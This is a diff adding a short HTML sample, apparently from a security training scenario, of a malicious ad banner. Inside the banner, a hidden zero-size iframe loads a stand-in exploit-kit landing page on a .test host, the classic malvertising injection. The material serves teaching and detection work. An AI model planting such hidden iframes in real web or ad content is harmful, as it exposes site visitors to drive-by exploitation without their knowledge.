@@ -1,0 +1,9 @@
+<!-- WCACE Scenario 18: Sample malicious ad HTML -->
+<!-- FOR EDUCATIONAL PURPOSES ONLY -->
+
+<div id="ad-banner" style="width:728px;height:90px;">
+  <img src="https://ads.tracknet-media.test/img/banner_sale.jpg" />
+  <!-- Hidden exploit kit iframe injected by compromised ad network -->
+  <iframe src="https://gate.exploitkit.test/landing?id=78a3c"
+          width="0" height="0" style="display:none;"></iframe>
+</div>
